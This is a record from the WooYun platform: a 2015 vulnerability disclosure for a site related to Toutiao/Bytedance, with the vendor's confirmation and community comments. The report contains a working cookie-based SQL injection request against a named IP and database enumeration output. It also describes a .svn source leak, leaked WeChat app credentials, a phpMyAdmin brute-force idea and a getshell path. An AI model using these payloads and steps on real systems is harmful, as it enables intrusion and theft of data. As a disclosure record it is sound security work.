{"id": 28136, "wybug_id": "wooyun-2015-0111246", "wybug_title": "今日头条某站cookie注入+源码泄露+getshell+微信key泄露", "wybug_corp": "字节跳动", "wybug_author": "杀器王子", "wybug_date": "2015-04-30 13:37", "wybug_open_date": "2015-06-18 18:04", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-04-30：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-05-04：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-05-14：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-05-24：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-06-03：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-06-18：\t细节向公众公开  简要描述： 今日头条某站cookie注入+源码泄露+getshell+微信key泄露 详细说明：  http://42.96.190.138/这个站存在SQL注入应该不止一处 cookie注入 数据包如下\nGET /index.php?g=WEBAPP&m=Index&a=getCategoryPagePropertyDepartment HTTP/1.1Host: 42.96.190.138Proxy-Connection: keep-aliveUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2376.0 Safari/537.36Accept: */*Referer: http://42.96.190.138:3333/index.php?g=WEBAPP&page=cusform-formlist&dept_id=1%20and%201=if(1=2,1,(select%201%20union%20select%202))Accept-Encoding: gzip, deflate, sdchAccept-Language: zh-CN,zh;q=0.8,en;q=0.6,zh-TW;q=0.4,ja;q=0.2Cookie: PHPSESSID=sqr24iplkeltnokj5g43q7et52; YP_onlineid=%22796df709c9c89a5d3e0e44e600a3efb8%22; last_update_time=2015-04-30+11%3A47%3A55; dept_id=11119 and 1=(updatexml(1,concat(0x3a,(select user() from mysql.user)),1)); YP_think_language=%22cn%22\n\n\n\navailable databases [2]:[*] information_schema[*] ttbdxt\n\n[11:59:41] [INFO] retrieved: imi_activity_count_plus_20150426[11:59:41] [INFO] retrieved: imi_activity_count_plus_20150427[11:59:41] [INFO] retrieved: imi_activity_count_plus_20150422[11:59:41] [INFO] retrieved: imi_activity_count_plus_20150424[11:59:41] [INFO] retrieved: imi_activity_count_plus_20150425[11:59:42] [INFO] retrieved: imi_activity_count_url[11:59:42] [INFO] retrieved: imi_activity_log[11:59:42] [INFO] retrieved: imi_activity_prize55122[11:59:42] [INFO] retrieved: imi_activity_count_plus_20150429[11:59:42] [INFO] retrieved: imi_activity_prize_record55122[11:59:42] [INFO] retrieved: imi_activity_record55122[11:59:42] [INFO] retrieved: imi_activity_count_plus_20150428[11:59:42] [INFO] retrieved: imi_app_log[11:59:42] [INFO] retrieved: imi_activity_count_plus_20150430[11:59:42] [INFO] retrieved: imi_block[11:59:42] [INFO] retrieved: imi_cart[11:59:42] [INFO] retrieved: imi_category[11:59:42] [INFO] retrieved: imi_attachment\n每天更新 最新数据imi_config中发现 | 图片最小宽度              | 0    | http://appadmin.imixun.com/                                                                     | watermark_minwidth          || 5       | CMS地址               | 0    | https://download.imixun.com/index.php?m=Download&appcode=ttbdxt&publishtype=online              | site_url                    || 5       | 水印最小高度              | 0    | https://download.imixun.com/index.php?m=Download&appcode=ttbdxt&publishtype=online              | watermark_minheight  \n\n下载抓包到了ttbdxt.imixun.com/index.php?g=API&m=GetActivityDetail   漏洞证明：  ttbdxt.imixun.com这个站存在相同的注入并且是root权限的 直接shell\n\n\n\n再回来看42.96.190.138http://42.96.190.138/.svn/entries代码泄露\n\nweixin的appid和secret也漏了\n\n虽然 42这个站注入不是root 但是 有phpmyadminhttp://42.96.190.138/phpmyadmin 可以爆破root密码简单审计代码发现也可以shell可以靠create这个功能写入shell\n\n   修复方案：  删除svn修复弱口令参数过滤   版权声明：转载请注明来源 杀器王子@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：20  确认时间：2015-05-04 18:03 厂商回复： 确认漏洞。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-04-30 13:41 |    \t\t’‘Nome \t\t\t( 实习白帽子  |\t\t\t        Rank:55 漏洞数:19        | 在此感谢 @M4sk @mango @裤裆 @泳少 @5up3r...)\t\t \n  无奈 ，我是沙发 、、、、、    \n     2015-04-30 13:53 |    \t\t紫霞仙子 \t\t\t( 普通白帽子  |\t\t\t        Rank:2027 漏洞数:279        | 天天向上 ！！！)\t\t \n  今日头条。    \n     2015-04-30 13:55 |    \t\t大亮 \t\t\t( 普通白帽子  |\t\t\t        Rank:306 漏洞数:65        | 慢慢挖洞)\t\t \n  名称好长    \n     2015-04-30 15:11 |    \t\tMr.R \t\t\t( 实习白帽子  |\t\t\t        Rank:52 漏洞数:14        | 求大神带我飞 qq2584110147)\t\t \n  杀器王子的杀器指向了今日头条    \n     2015-04-30 15:30 |    \t\t子非海绵宝宝  \t\t\t( 核心白帽子 |\t\t\t        Rank:1044 漏洞数:106        | 发扬海绵宝宝的精神!你不是海绵宝宝,你怎...)\t\t \n  今天头条:胸器妹纸今天日了我    \n     2015-04-30 15:43 |    \t\tkaysen \t\t\t( 路人 |\t\t\t        Rank:8 漏洞数:3        | 折腾Python、Php、Linux)\t\t \n  记得之前去今日头条面试，技术老大很注重SQL注入和XSS    \n     2015-04-30 16:10 |    \t\t茜茜公主 \t\t\t( 普通白帽子  |\t\t\t        Rank:2360 漏洞数:406        | 家里二宝出生，这几个月忙着把屎把尿...忒...)\t\t \n  我喜欢getshell    \n     2015-04-30 16:10 |    \t\tBMa \t\t\t( 普通白帽子  |\t\t\t        Rank:1776 漏洞数:200        )\t\t \n  @kaysen 看业务需求    \n     2015-05-01 00:41 |    \t\t明月影 \t\t\t( 路人 |\t\t\t        Rank:12 漏洞数:8        | 学姿势，学思路。)\t\t \n  涨姿势来了。    \n     2015-05-01 17:05 |    \t\tSword \t\t\t( 路人 |\t\t\t        Rank:16 漏洞数:11        | 求大牛带飞)\t\t \n  好长的标题    \n     2015-05-04 22:21 |    \t\t姗姗来迟 \t\t\t( 普通白帽子  |\t\t\t        Rank:297 漏洞数:72        | coffeesafe的小号)\t\t \n  打脸    \n     2015-05-26 10:58 |    \t\t聆听 \t\t\t( 路人 |\t\t\t        Rank:8 漏洞数:3        | why are you so diao ！)\t\t \n  提醒：目前漏洞有限制开放中，你的 Rank 级别不够    \n     2015-05-26 17:42 |    \t\ther0ma \t\t\t( 核心白帽子 |\t\t\t        Rank:598 漏洞数:84        | 专注小厂商三十年！)\t\t \n  头条是有节操的厂商，楼主也是有节操的白帽子！听闻楼主已经勾搭了一个个妹子，给楼主的妹子送一打京东购物卡吧 ！    \n     2015-06-17 08:12 |    \t\t聆听 \t\t\t( 路人 |\t\t\t        Rank:8 漏洞数:3        | why are you so diao ！)\t\t \n  提醒：级别足够但是无法查看 Rank 高于自己的白帽子漏洞 ( 可以等待进一步公开或者支付 10 个乌云币提前查看    \n     2015-06-18 20:37 |    \t\t明月影 \t\t\t( 路人 |\t\t\t        Rank:12 漏洞数:8        | 学姿势，学思路。)\t\t \n  连环杀手啊。思路真好。    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 20, "Ranks": null}